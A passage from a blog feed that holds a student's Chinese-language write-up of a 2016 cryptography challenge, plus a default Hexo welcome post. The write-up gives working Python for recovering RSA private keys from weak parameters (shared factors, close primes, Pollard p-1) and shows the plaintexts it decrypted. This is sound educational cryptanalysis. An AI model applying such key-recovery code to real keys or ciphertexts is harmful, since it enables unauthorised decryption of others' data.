class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">因数碰撞攻击</span></span><br><span class="line"><span class="string">当存在两个公钥的 N 不互素时，我们显然可以直接对这两个数求最大公因数，然后直接获得 p，q，进而获得相应的私钥。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_factor_pairs</span>():</span></span><br><span class="line">    pairs = []</span><br><span class="line">    <span class="comment"># 遍历每个组合，找到有最大公约数不为1的n1，n2对</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ns)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,<span class="built_in">len</span>(ns)):</span><br><span class="line">            ni = <span class="built_in">int</span>(ns[i],<span class="number">16</span>)</span><br><span class="line">            nj = <span class="built_in">int</span>(ns[j],<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> ni == nj:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> gmpy2.gcd(ni,nj)!=<span class="number">1</span>:</span><br><span class="line">                pairs.append([i,j,gmpy2.gcd(ni,nj)])</span><br><span class="line">    <span class="comment"># print打印pairs</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pairs:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;出现碰撞的frame序号为 &quot;</span>,i[<span class="number">0</span>],<span class="string">&quot; &quot;</span>,i[<span class="number">1</span>],<span class="string">&quot; 公因数为 &quot;</span>,i[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">return</span> pairs</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sameFactorAttack</span>(<span class="params">i,j</span>):</span></span><br><span class="line">    <span class="comment"># 对pairs中的每个组合进行破解</span></span><br><span class="line">    ni = <span class="built_in">int</span>(ns[i], <span class="number">16</span>); nj = <span class="built_in">int</span>(ns[j], <span class="number">16</span>)</span><br><span class="line">    ci = <span class="built_in">int</span>(cs[i], <span class="number">16</span>); cj = <span class="built_in">int</span>(cs[j], <span class="number">16</span>)</span><br><span class="line">    ei = <span class="built_in">int</span>(es[i], <span class="number">16</span>); ej = <span class="built_in">int</span>(es[j], <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># 求ni nj公因数得到p</span></span><br><span class="line">    p = gmpy2.gcd(ni,nj)</span><br><span class="line">    qi = ni//p</span><br><span class="line">    qj = nj//p</span><br><span class="line">    <span class="comment"># 根据欧拉定理，求phi</span></span><br><span class="line">    phi_i = (p-<span class="number">1</span>)*(qi-<span class="number">1</span>)</span><br><span class="line">    phi_j = (p-<span class="number">1</span>)*(qj-<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 由ed = 1 mod phi可以得到 d = e^-1 mod phi</span></span><br><span class="line">    di = gmpy2.invert(ei,phi_i)</span><br><span class="line">    dj = gmpy2.invert(ej,phi_j)</span><br><span class="line">    <span class="comment"># 明文m = c^d mod n</span></span><br><span class="line">    mi = gmpy2.powmod(ci,di,ni)</span><br><span class="line">    mj = gmpy2.powmod(cj,dj,nj)</span><br><span class="line">    <span class="built_in">print</span>(binascii.a2b_hex(<span class="built_in">hex</span>(mi)[<span class="number">2</span>:]))</span><br><span class="line">    <span class="built_in">print</span>(binascii.a2b_hex(<span class="built_in">hex</span>(mj)[<span class="number">2</span>:]))</span><br><span class="line">    <span class="keyword">return</span> binascii.a2b_hex(<span class="built_in">hex</span>(mi)[<span class="number">2</span>:]),binascii.a2b_hex(<span class="built_in">hex</span>(mj)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><h3 id="4-费马分解法：p-q分解"><a href="#4-费马分解法：p-q分解" class="headerlink" title="4.费马分解法：p-q分解"></a>4.费马分解法：p-q分解</h3><p><em>攻击条件：</em>p或q选择不当：|p-q|较小</p><p><em>攻击原理：</em></p><p>由如下式子：</p><script type="math/tex; mode=display">\frac{(p+q)^2}{4}-n=\frac{(p+q)^2}{4}-pq=\frac{(p-q)^2}{4}</script><p>可以看到，$|p-q|$较小时，$\frac{(p-q)^2}{4}$也较小，从而$\frac{(p+q)^2}{4}$只是比$n$稍微大了一点点，从而$\frac{p+q}{2}$与$\sqrt{n}$相近。那么我们可以：</p><ul><li>顺序检查$\sqrt{n}$的每一个整数$x$，直到找到一个$x$使得$x^2-n$是平方数，记为$y^2$</li><li>那么$x^2-n=y^2$，进而根据平方差公式即可分解$N$</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fermat_pq_get_p</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="comment"># 定义一个较小（也没有很小）的常数b</span></span><br><span class="line">    b = math.factorial(<span class="number">2</span>**<span class="number">14</span>)</span><br><span class="line">    <span class="comment"># 从u0 = sqrt(n)开始遍历</span></span><br><span class="line">    u0 = gmpy2.iroot(n,<span class="number">2</span>)[<span class="number">0</span>]+<span class="number">1</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; b-<span class="number">1</span>:</span><br><span class="line">        u = (u0+i)*(u0+i)-n</span><br><span class="line">        <span class="comment"># 如果u是某个数的平方张，则u为y^2，u0+i为x</span></span><br><span class="line">        <span class="keyword">if</span> gmpy2.is_square(u):</span><br><span class="line">            v=gmpy2.isqrt(u)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="comment"># 此时p，q为x-y 和 x+y，我们返回x+y的值</span></span><br><span class="line">    <span class="keyword">return</span> (u0+i)+v</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fermart_crack</span>(<span class="params">i</span>):</span></span><br><span class="line">    n = <span class="built_in">int</span>(ns[i], <span class="number">16</span>)</span><br><span class="line">    c = <span class="built_in">int</span>(cs[i], <span class="number">16</span>)</span><br><span class="line">    e = <span class="built_in">int</span>(es[i], <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># 分解n得到p，q</span></span><br><span class="line">    p = fermat_pq_get_p(n)</span><br><span class="line">    q = n//p</span><br><span class="line">    <span class="comment"># 根据欧拉定理，求phi</span></span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 由ed = 1 mod phi可以得到 d = e^-1 mod phi</span></span><br><span class="line">    d = gmpy2.invert(e,phi)</span><br><span class="line">    <span class="comment"># 明文m = c^d mod n</span></span><br><span class="line">    m = gmpy2.powmod(c,d,n)</span><br><span class="line">    <span class="built_in">print</span>(binascii.a2b_hex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line">    <span class="keyword">return</span> binascii.a2b_hex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><h3 id="5-pollard-p-1分解法"><a href="#5-pollard-p-1分解法" class="headerlink" title="5.pollard p-1分解法"></a>5.pollard p-1分解法</h3><p>攻击条件：适用于$p-1$或$q-1$能够被小素数整除的情况，通过此分解法可以找到一个因子$d$满足$d|n$</p><p>攻击原理：</p><p>寻找一个整数k，k要满足(p-1)|k!，由欧拉定理可以得知，若a和p互素：</p><script type="math/tex; mode=display">a^{p-1}=1\ mod\ p</script><p>即：</p><script type="math/tex; mode=display">a^{k!}=1\ mod\ p</script><p>则：$p|(a^{k!}-1)$，这样的话，$n$和$(a^{k!}-1)$必由一个公因数p，这样的话只需求$p=gcd(n,a^{k!}-1)$，之后就能够轻易地分解出n来了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Pollard p-1 分解法</span></span><br><span class="line"><span class="string">适用于p-1或q-1能够被小素数整除的情况</span></span><br><span class="line"><span class="string">通过此分解法可以找到一个因子d|n</span></span><br><span class="line"><span class="string">原理是找到一个满足(p-1)|k!的整数k，由fermart小定理，a^p-1=1 mod p ----&gt; p|(a^k!-1)</span></span><br><span class="line"><span class="string">这样n与(a^k!-1)有公因数p，n被分解出来</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollard_p_1</span>(<span class="params">n</span>):</span></span><br><span class="line">    m = <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,n):</span><br><span class="line">        <span class="comment"># 此时每次遍历，m=2^(k!)</span></span><br><span class="line">        m = <span class="built_in">pow</span>(m,k,n)</span><br><span class="line">        <span class="comment"># 找到一个k使得p|(a^k!-1)，即(a^k!-1)与n有公因数p</span></span><br><span class="line">        <span class="keyword">if</span> gmpy2.gcd(m - <span class="number">1</span>, n) != <span class="number">1</span>:</span><br><span class="line">            <span class="comment"># 返回p</span></span><br><span class="line">            <span class="keyword">return</span> gmpy2.gcd(m - <span class="number">1</span>, n)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">(github上原文的内容有问题，解不出来)</span></span><br><span class="line"><span class="string">0.固定一个整数B=2**20</span></span><br><span class="line"><span class="string">1.选择一个整数k，k为满足b&lt;=B的大部分或者全部b的乘积，可以选：k = B!</span></span><br><span class="line"><span class="string">2.选择一个随机整数a：2&lt;a&lt;n-2</span></span><br><span class="line"><span class="string">3.计算r = a^k mod n</span></span><br><span class="line"><span class="string">4.计算d = gcd(r-1,n)</span></span><br><span class="line"><span class="string">5.如果d=1或d=n,回到1，否则我们找到d为一个因子</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># def pollard_p_1(n):</span></span><br><span class="line"><span class="comment">#     B = 2**20</span></span><br><span class="line"><span class="comment">#     while True:</span></span><br><span class="line"><span class="comment">#         k = math.factorial(B)</span></span><br><span class="line"><span class="comment">#         a = random.randint(3,n-2)</span></span><br><span class="line"><span class="comment">#         r = a**k%n</span></span><br><span class="line"><span class="comment">#         d = gmpy2.gcd(r-1,n)</span></span><br><span class="line"><span class="comment">#         if d==1 or d==n:</span></span><br><span class="line"><span class="comment">#             continue</span></span><br><span class="line"><span class="comment">#         return d</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p1_crack</span>(<span class="params">i</span>):</span></span><br><span class="line">    n = <span class="built_in">int</span>(ns[i], <span class="number">16</span>)</span><br><span class="line">    c = <span class="built_in">int</span>(cs[i], <span class="number">16</span>)</span><br><span class="line">    e = <span class="built_in">int</span>(es[i], <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># 分解n得到d=p，之后算q</span></span><br><span class="line">    p = pollard_p_1(n)</span><br><span class="line">    q = n//p</span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 由ed = 1 mod phi可以得到 d = e^-1 mod phi</span></span><br><span class="line">    d = gmpy2.invert(e,phi)</span><br><span class="line">    <span class="comment"># 明文m = c^d mod n</span></span><br><span class="line">    m = gmpy2.powmod(c,d,n)</span><br><span class="line">    <span class="built_in">print</span>(binascii.a2b_hex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line">    <span class="keyword">return</span> binascii.a2b_hex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><h2 id="分析Frame文件，进行RSA攻击"><a href="#分析Frame文件，进行RSA攻击" class="headerlink" title="分析Frame文件，进行RSA攻击"></a>分析Frame文件，进行RSA攻击</h2><ul><li>Frame0和Frame4的模数N相同，假设这两片段对应的明文内容相同，则可以使用公共模数攻击的方法</li><li>Frame1和Frame18的模数N具有公共因子，可以通过因数碰撞法还原明文</li><li>Frame3，Frame8，Frame12，Frame16和Frame20采用低加密指数<code>e=5</code>进行加密</li><li>Frame7，Frame11，Frame15采用低加密指数<code>e=3</code>进行加密</li><li>Frame10 经尝试后发现其p，q选择较为接近，采用费马分解法(p-q法)进行破解</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">数据读取</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readFrames</span>():</span></span><br><span class="line">    ns = []</span><br><span class="line">    cs = []</span><br><span class="line">    es = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;RSA大礼包/frame_set/Frame&quot;</span>+<span class="built_in">str</span>(i), <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            tmp = f.read()</span><br><span class="line">            ns.append(tmp[<span class="number">0</span>:<span class="number">256</span>])</span><br><span class="line">            es.append(tmp[<span class="number">256</span>:<span class="number">512</span>])</span><br><span class="line">            cs.append(tmp[<span class="number">512</span>:<span class="number">768</span>])</span><br><span class="line">    <span class="keyword">return</span> ns,cs,es</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ns,cs,es = readFrames()</span><br><span class="line">    pt = [<span class="string">&quot;&quot;</span>]*<span class="built_in">len</span>(ns)</span><br><span class="line">    <span class="comment">#针对Frame0和Frame4，构建共模攻击函数</span></span><br><span class="line">    pt[<span class="number">4</span>] = sameModulAttack(<span class="number">0</span>, <span class="number">4</span>)</span><br><span class="line">    pt[<span class="number">0</span>]=pt[<span class="number">4</span>]</span><br><span class="line">    <span class="comment">#针对Frame1和Frame18，构造因数碰撞函数</span></span><br><span class="line">    pairs = get_factor_pairs()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pairs:</span><br><span class="line">        pt[i[<span class="number">0</span>]],pt[i[<span class="number">1</span>]] = sameFactorAttack(i[<span class="number">0</span>],i[<span class="number">1</span>])</span><br><span class="line">    <span class="comment">#针对Frame10采用费马分解法(p-q法)进行破解</span></span><br><span class="line">    pt[<span class="number">10</span>] = fermart_crack(<span class="number">10</span>)</span><br><span class="line">    <span class="comment">#针对Frame2,Frame6,Frame19,构造Pollard p-1分解函数分解</span></span><br><span class="line">    pt[<span class="number">2</span>] = p1_crack(<span class="number">2</span>)</span><br><span class="line">    pt[<span class="number">6</span>] = p1_crack(<span class="number">6</span>)</span><br><span class="line">    pt[<span class="number">19</span>] = p1_crack(<span class="number">19</span>)</span><br><span class="line">    <span class="comment">#针对Frame3,Frame8,Frame12,Frame16,Frame20采用低加密指数e=5进行加密，恰好能够进行爆破</span></span><br><span class="line">    pt[<span class="number">3</span>] = lowEburp5()</span><br><span class="line">    pt[<span class="number">8</span>] = pt[<span class="number">3</span>]</span><br><span class="line">    pt[<span class="number">12</span>] = pt[<span class="number">3</span>]</span><br><span class="line">    pt[<span class="number">16</span>] = pt[<span class="number">3</span>]</span><br><span class="line">    pt[<span class="number">20</span>] = pt[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 展示结果</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(pt)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Frame &quot;</span>,i,<span class="string">&quot; 破译结果为：&quot;</span>,pt[i][-<span class="number">8</span>:])</span><br></pre></td></tr></table></figure><p>​    <strong>3.实验结果</strong></p><p>程序运行的结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;\x98vT2\x10\xab\xcd\xef\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00My secre&#x27;</span><br><span class="line">出现碰撞的frame序号为  1   18  公因数为  72732681634</span><br><span class="line">65293471933643674908027120929096536045429682300347130226398442391418956862476173798834057392247872274441320512158525416407044516675402521694747</span><br><span class="line">b&#x27;\x98vT2\x10\xab\xcd\xef\x00\x00\x00\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00. Imagin&#x27;</span><br><span class="line">b&#x27;\x98vT2\x10\xab\xcd\xef\x00\x00\x00\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00m A to B&#x27;</span><br><span class="line">b&#x27;\x98vT2\x10\xab\xcd\xef\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00will get&#x27;</span><br><span class="line">b&#x27;\x98vT2\x10\xab\xcd\xef\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 That is&#x27;</span><br><span class="line">b&#x27;\x98vT2\x10\xab\xcd\xef\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 &quot;Logic &#x27;</span><br><span class="line">b&#x27;\x98vT2\x10\xab\xcd\xef\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00instein.&#x27;</span><br><span class="line">b&#x27;\x98vT2\x10\xab\xcd\xef\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t is a f&#x27;</span><br><span class="line"></span><br><span class="line">Frame  0  破译结果为： b&#x27;My secre&#x27;</span><br><span class="line">Frame  1  破译结果为： b&#x27;. Imagin&#x27;</span><br><span class="line">Frame  2  破译结果为： b&#x27; That is&#x27;</span><br><span class="line">Frame  3  破译结果为： b&#x27;t is a f&#x27;</span><br><span class="line">Frame  4  破译结果为： b&#x27;My secre&#x27;</span><br><span class="line">Frame  5  破译结果为： </span><br><span class="line">Frame  6  破译结果为： b&#x27; &quot;Logic &#x27;</span><br><span class="line">Frame  7  破译结果为： </span><br><span class="line">Frame  8  破译结果为： b&#x27;t is a f&#x27;</span><br><span class="line">Frame  9  破译结果为： </span><br><span class="line">Frame  10  破译结果为： b&#x27;will get&#x27;</span><br><span class="line">Frame  11  破译结果为： </span><br><span class="line">Frame  12  破译结果为： b&#x27;t is a f&#x27;</span><br><span class="line">Frame  13  破译结果为： </span><br><span class="line">Frame  14  破译结果为： </span><br><span class="line">Frame  15  破译结果为： </span><br><span class="line">Frame  16  破译结果为： b&#x27;t is a f&#x27;</span><br><span class="line">Frame  17  破译结果为： </span><br><span class="line">Frame  18  破译结果为： b&#x27;m A to B&#x27;</span><br><span class="line">Frame  19  破译结果为： b&#x27;instein.&#x27;</span><br><span class="line">Frame  20  破译结果为： b&#x27;t is a f&#x27;</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码 0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​    <strong>4.总结</strong></p><p>通过完成本次大作业我学习了一些针对RSA算法的攻击方式，收获很大。同时我了解到即便 RSA 算法目前来说是安全可靠的，但是错误的应用场景，错误的环境配置，以及错误的使用方法都会导致 RSA 的算法体系出现问题，因此日后学习过程中遇到相关的问题时要多留心思考研究，以免出现疏漏。</p><p>​    <strong>5.参考</strong></p><p><a href="https://www.tr0y.wang/2017/11/06/CTFRSA/#例题-6">https://www.tr0y.wang/2017/11/06/CTFRSA/#%E4%BE%8B%E9%A2%98-6</a> </p><p><a href="https://www.tr0y.wang/2017/10/31/RSA2016/">https://www.tr0y.wang/2017/10/31/RSA2016/</a>  </p><p><a href="https://github.com/blank-vax/RSA_breaking">https://github.com/blank-vax/RSA_breaking</a>  </p>]]></content>
    
    
    <summary type="html">&lt;p&gt;首届（2016）全国高校密码数学挑战赛&lt;/p&gt;</summary>
    
    
    
    
    <category term="密码学" scheme="http://example.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    <category term="作业" scheme="http://example.com/tags/%E4%BD%9C%E4%B8%9A/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2022/01/12/hello-world/"/>
    <id>http://example.com/2022/01/12/hello-world/</id>
    <published>2022-01-11T17:33:36.569Z</published>
    <updated>2022-01-13T07:15:32.382Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><span id="more"></span><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
</feed>
